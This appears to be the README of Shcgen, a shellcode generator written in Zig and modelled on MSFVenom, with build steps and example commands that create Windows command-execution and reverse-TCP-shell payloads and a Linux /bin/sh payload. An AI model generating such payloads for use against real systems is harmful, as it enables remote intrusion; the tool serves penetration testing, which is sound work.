# Shcgen

A shellcode generator written in Zig. This is inspired by MSFVenom.

<br />

## Install

Download from [releases](/releases) page.

### Build from Source

```sh
git clone https://github.com/hideckies/shcgen
cd shcgen
zig build --release=small
./zig-out/bin/shcgen --help
```

## How To Use

### Generate Windows Payloads

```sh
# Example 1. Execute arbitrary command
shcgen -p windows/x64/exec --cmd calc -f raw -o /tmp/shellcode.bin

# Example 2. Reverse Shell
shcgen -p windows/x64/shell_reverse_tcp --lhost 127.0.0.1 --lport 4444 -f raw -o /tmp/shellcode.bin
```

### Generate Linux Payloads

```sh
# Example 1. Execute arbitrary command
shcgen -p linux/x64/exec --cmd /bin/sh -f hex
```

See [examples](/examples/) for more details.

<br />

